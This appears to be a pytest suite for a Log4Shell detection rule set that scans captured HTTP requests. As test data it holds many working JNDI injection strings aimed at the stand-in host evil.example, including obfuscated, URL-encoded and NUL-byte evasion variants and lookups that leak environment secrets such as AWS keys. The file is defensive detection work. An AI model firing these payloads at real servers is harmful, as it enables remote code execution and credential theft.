import time
from datetime import UTC, datetime
from ipaddress import ip_address
from uuid import uuid4

import pytest

from domain.captured_request import CapturedRequest
from workers.detector.log4shell import RULES, deobfuscate
from workers.detector.rules import RuleRegistry


def _request(
    *,
    path: str = "/",
    query: str = "",
    body: str = "",
    headers: list[tuple[str, str]] | None = None,
) -> CapturedRequest:
    return CapturedRequest(
        ts=datetime(2026, 1, 1, tzinfo=UTC),
        session_id=uuid4(),
        world_id="w",
        ip=ip_address("203.0.113.9"),
        method="GET",
        path=path,
        query=query,
        body_excerpt=body,
        headers=headers or [],
    )


@pytest.fixture(scope="module")
def registry() -> RuleRegistry:
    registry = RuleRegistry()
    for rule in RULES:
        registry.register(rule)
    return registry


def _fired(registry: RuleRegistry, request: CapturedRequest) -> set[str]:
    return {d.rule for d in registry.evaluate(request)}


ATTACKS = [
    ("x=${jndi:ldap://evil.example/a}", "log4shell.jndi_lookup"),
    ("x=${jndi:rmi://evil.example/a}", "log4shell.jndi_lookup"),
    ("x=${jndi:dns://evil.example}", "log4shell.jndi_lookup"),
    ("x=${JNDI:LDAPS://evil.example/a}", "log4shell.jndi_lookup"),
    ("x=${jndi:ldap://127.0.0.1#evil.example/a}", "log4shell.jndi_lookup"),
    ("x=${${lower:j}ndi:ldap://evil.example/a}", "log4shell.jndi_obfuscated"),
    (
        "x=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/a}",
        "log4shell.jndi_obfuscated",
    ),
    ("x=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}", "log4shell.jndi_obfuscated"),
    ("x=${${env:NaN:-j}ndi${env:NaN:-:}ldap://evil.example/a}", "log4shell.jndi_obfuscated"),
    ("x=${j${::-n}di:ldap://evil.example/a}", "log4shell.jndi_obfuscated"),
    ("x=${${lower:${lower:jndi}}:ldap://evil.example/a}", "log4shell.jndi_obfuscated"),
    ("x=${${a:-j}${b:-n}${c:-d}${d:-i}:ldap://evil.example/a}", "log4shell.jndi_obfuscated"),
    ("x=${env:AWS_SECRET_ACCESS_KEY}", "log4shell.lookup_probe"),
    ("x=${sys:user.name}", "log4shell.lookup_probe"),
    ("x=${java:version}", "log4shell.lookup_probe"),
    ("x=${jndi:ldap://${env:USER}.evil.example/a}", "log4shell.lookup_probe"),
]


@pytest.mark.parametrize(("query", "rule"), ATTACKS, ids=[a[0][:50] for a in ATTACKS])
def test_attack_fires_expected_rule(registry: RuleRegistry, query: str, rule: str) -> None:
    assert rule in _fired(registry, _request(query=query))


def test_plain_lookup_is_not_reported_as_obfuscated(registry: RuleRegistry) -> None:
    fired = _fired(registry, _request(query="x=${jndi:ldap://evil.example/a}"))

    assert "log4shell.jndi_lookup" in fired
    assert "log4shell.jndi_obfuscated" not in fired


def test_obfuscated_lookup_fires_both_rules(registry: RuleRegistry) -> None:
    fired = _fired(registry, _request(query="x=${${lower:j}ndi:ldap://evil.example/a}"))

    assert {"log4shell.jndi_lookup", "log4shell.jndi_obfuscated"} <= fired


@pytest.mark.parametrize(
    "query",
    [
        "x=%24%7Bjndi:ldap://evil.example/a%7D",
        "x=%2524%257Bjndi:ldap://evil.example/a%257D",  # double-encoded
        "x=$%00{jndi:ldap://evil.example/a}",  # NUL byte
        "x=%24%7B%24%7Blower:j%7Dndi:ldap://evil.example/a%7D",
    ],
)
def test_encoded_payloads_are_still_detected(registry: RuleRegistry, query: str) -> None:
    assert "log4shell.jndi_lookup" in _fired(registry, _request(query=query))


def test_payload_in_body_path_and_headers(registry: RuleRegistry) -> None:
    payload = "${jndi:ldap://evil.example/a}"

    assert "log4shell.jndi_lookup" in _fired(registry, _request(body=f'{{"user": "{payload}"}}'))
    assert "log4shell.jndi_lookup" in _fired(registry, _request(path=f"/users/{payload}"))
    for header in ("User-Agent", "X-Api-Version", "Referer", "X-Forwarded-For", "Cookie"):
        assert "log4shell.jndi_lookup" in _fired(registry, _request(headers=[(header, payload)]))


def test_detection_carries_rule_metadata_and_excerpt(registry: RuleRegistry) -> None:
    detections = registry.evaluate(_request(query="x=${${lower:j}ndi:ldap://evil.example/a}&y=1"))

    by_rule = {d.rule: d for d in detections}
    assert by_rule["log4shell.jndi_lookup"].matched_excerpt == "${jndi:ldap://evil.example/a}"
    assert by_rule["log4shell.jndi_lookup"].category == "log4shell"
    assert by_rule["log4shell.jndi_lookup"].severity.value == "critical"


def test_obfuscated_excerpt_is_the_payload_as_sent(registry: RuleRegistry) -> None:
    payload = "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}"

    detections = registry.evaluate(_request(query=f"a=${{price}}&x={payload}&y=1"))

    by_rule = {d.rule: d for d in detections}
    assert by_rule["log4shell.jndi_obfuscated"].matched_excerpt == payload
    assert by_rule["log4shell.jndi_lookup"].matched_excerpt == "${jndi:ldap://evil.example/a}"


@pytest.mark.parametrize(
    ("raw", "resolved"),
    [
        ("${lower:J}ndi", "Jndi"),
        ("${::-j}${::-n}", "jn"),
        ("${env:X:-a}b", "ab"),
        ("${lower:${lower:AB}}", "AB"),
        ("plain text", "plain text"),
        ("${price}", "${price}"),
    ],
)
def test_deobfuscate(raw: str, resolved: str) -> None:
    assert deobfuscate(raw) == resolved


CLEAN = [
    "text=cost is ${price}",
    "text=hello ${user.name}",
    "text=${name} and ${other}",
    "text=$5 {discount}",
    "q=jndi tutorial",
    "q=java naming and directory interface",
    "q=${lower:x}",
    "q=${a:-b}",
    "q=ldap://example.com",
    "q=$ {jndi}",
    "q={jndi:ldap}",
    "q=%24%7Bprice%7D",
    "email=a%2Bb%40example.com",
]


@pytest.mark.parametrize("query", CLEAN)
def test_ordinary_queries_do_not_fire(registry: RuleRegistry, query: str) -> None:
    assert _fired(registry, _request(query=query)) == set()


def test_ordinary_requests_do_not_fire(registry: RuleRegistry) -> None:
    request = _request(
        path="/api/v1/products/42",
        body='{"title": "Rock & Roll", "template": "Dear ${name}, your total is ${total}"}',
        headers=[
            ("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"),
            ("Accept", "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8"),
            ("Referer", "https://shop.example/search?q=shoes&sort=price"),
            ("Cookie", "session=abc123; theme=dark"),
        ],
    )

    assert _fired(registry, request) == set()


def test_rule_set_is_consistent() -> None:
    names = [rule.name for rule in RULES]

    assert len(names) == len(set(names))
    assert all(rule.category == "log4shell" for rule in RULES)
    assert all(name.startswith("log4shell.") for name in names)


@pytest.mark.parametrize(
    "body",
    [
        "${" * 4000,
        "${lower:" * 1000,
        "${::-" * 1600,
        "${" + "a" * 8000,
        "${" + ":-" * 4000,
        "${jndi:" + "a" * 8000,
        "${${${${${${${${" * 500,
        "${" + " " * 8000 + "jndi:",
        "${env:" + "a" * 8000,
        "}" * 8000,
    ],
    ids=[
        "open-spam",
        "lower-spam",
        "default-spam",
        "open-long",
        "default-chain",
        "jndi-long",
        "nested-spam",
        "open-spaces",
        "env-long",
        "close-spam",
    ],
)
def test_adversarial_input_is_processed_quickly(registry: RuleRegistry, body: str) -> None:
    started = time.perf_counter()
    registry.evaluate(_request(body=body))

    assert time.perf_counter() - started < 0.5
